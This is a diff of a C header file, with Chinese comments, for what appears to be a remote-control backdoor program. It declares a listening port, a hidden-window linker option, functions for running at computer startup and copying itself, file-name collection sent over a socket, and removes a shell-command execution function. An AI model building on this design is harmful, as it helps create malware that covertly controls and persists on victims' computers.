@@ -24,8 +24,7 @@
 //#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
 #define PORT 65533
 //#define err(errMsg) printf("[line: %d]%s failed code %d\n", __LINE__, errMsg, WSAGetLastError())
-#define FileNameRow 200		//定义获取文件名的二维数组大小
-#define FileNameCol 100
+#define Row BUFSIZ		//定义获取文件名的二维数组大小
 
 static const char BASE32_MAP[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567=";
 static const uint8_t BASE32_REVERSE_MAP[] =
@@ -79,9 +78,7 @@ int ComputerStart(char* pathName);
 LPWSTR CharToLPWSTR(const char* szString);
 //自我复制
 int copySelf(char* path);
-//执行shell指令
-int cmd(char* cmdStr, char* message);
 //获取文件名
-void GetFileName(char FileName[FileNameRow][FileNameCol], char* str);
+void GetFileName(SOCKET fd, char FileName[Row], char* str);
 
 #endif // !_TCPSOCKET_H
